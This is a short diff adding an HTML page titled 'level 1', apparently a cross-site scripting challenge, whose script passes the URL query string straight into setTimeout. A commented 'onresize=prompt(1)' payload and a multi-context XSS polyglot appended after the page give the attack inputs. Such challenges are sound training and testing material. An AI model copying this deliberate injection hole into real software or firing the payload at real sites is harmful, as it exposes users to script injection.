@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>level 1</title>
+</head>
+<body>
+<script type="text/javascript">
+    var isNull = function(a) {
+        return typeof a == "object" && !a;
+    }
+    var getUrlparam = function( key, url){
+        url = url || location.href;
+        var result = url.match(new RegExp("[\#|\?]([^#]*)[\#|\?]?"));
+        url = "&" + (isNull(result) ? "" : result[1]);
+        result = url.match(new RegExp("&" + key + "=", "i"));
+        return isNull(result) ? undefined : url.substr(result.index + 1).split("&")[0].split("=")[1];
+    }
+    setTimeout(location.search.slice(1));
+    //document.body.innerHTML = escape1(`"onresize="prompt(1)`)
+</script>
+</body>
+</html>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
